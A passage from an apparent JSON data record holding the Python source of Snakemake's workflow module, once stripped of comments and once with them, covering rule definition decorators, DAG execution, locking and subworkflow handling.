UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not 